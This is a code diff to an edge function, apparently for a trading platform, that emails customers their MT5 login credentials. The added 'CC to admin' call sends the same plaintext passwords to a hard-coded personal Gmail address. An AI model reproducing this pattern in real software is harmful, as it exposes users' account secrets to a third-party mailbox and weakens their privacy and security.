@@ -87,15 +87,19 @@ Deno.serve(async (req) => {
         const { data: challengeInfo } = await adminClient.from("challenges").select("name, account_size").eq("id", purchase.challenge_id).single();
         
         if (credDetails) {
+          const credEmailData = { mt5Login: credDetails.mt5_login, mt5Password: credDetails.mt5_password, mt5Server: credDetails.mt5_server, challengeName: challengeInfo?.name || "", accountSize: challengeInfo ? `$${challengeInfo.account_size / 1000}K` : "" };
           try {
+            // Send to customer
             await fetch(`${supabaseUrl}/functions/v1/send-transactional-email`, {
               method: "POST",
-              headers: { Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`, "Content-Type": "application/json" },
-              body: JSON.stringify({
-                type: "credentials",
-                recipientUserId: purchase.user_id,
-                data: { mt5Login: credDetails.mt5_login, mt5Password: credDetails.mt5_password, mt5Server: credDetails.mt5_server, challengeName: challengeInfo?.name || "", accountSize: challengeInfo ? `$${challengeInfo.account_size / 1000}K` : "" },
-              }),
+              headers: { Authorization: `Bearer ${supabaseServiceKey}`, "Content-Type": "application/json" },
+              body: JSON.stringify({ type: "credentials", recipientUserId: purchase.user_id, data: credEmailData }),
+            });
+            // CC to admin
+            await fetch(`${supabaseUrl}/functions/v1/send-transactional-email`, {
+              method: "POST",
+              headers: { Authorization: `Bearer ${supabaseServiceKey}`, "Content-Type": "application/json" },
+              body: JSON.stringify({ type: "credentials", data: credEmailData, recipientOverride: "notchiragc@gmail.com" }),
             });
           } catch (e) { console.error("Cred email failed:", e); }
         }
